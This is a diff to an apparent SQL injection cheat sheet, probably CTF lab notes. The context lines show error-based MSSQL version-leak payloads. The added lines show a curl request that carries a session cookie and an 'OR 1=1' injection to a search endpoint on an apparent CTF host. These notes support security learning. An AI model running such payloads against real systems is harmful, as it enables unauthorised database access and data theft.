@@ -86,10 +86,10 @@ Forces database errors to gather information about the backend:
 username' AND 1=convert(int,@@version)--       # Forces type conversion error, reveals MSSQL version
 username' AND 1=cast((SELECT @@version) as int)--  # Alternative version check for MSSQL
 
-
-
-
-
+# SQL INJECTION TROUGH COOKIES
+┌─[✗]─[live@parrot]─[~]
+└──╼ $curl -H "cookie:connect.sid=s%3AKVZWr3DsL9RDCdAS5y_Mv__c_B4qk8KD.hZhhC9fdHwrvYTU0ZIpVeTbr17wkozuckgVb%2FhgrG6g" "http://labs.ctfzone.com:6221/api/contacts/search?q=a%27%29%20OR%201=1%20--%20"
+PAYLOAD USED:   search?q=a%27%29%20OR%201=1%20--%20"
 
 
 
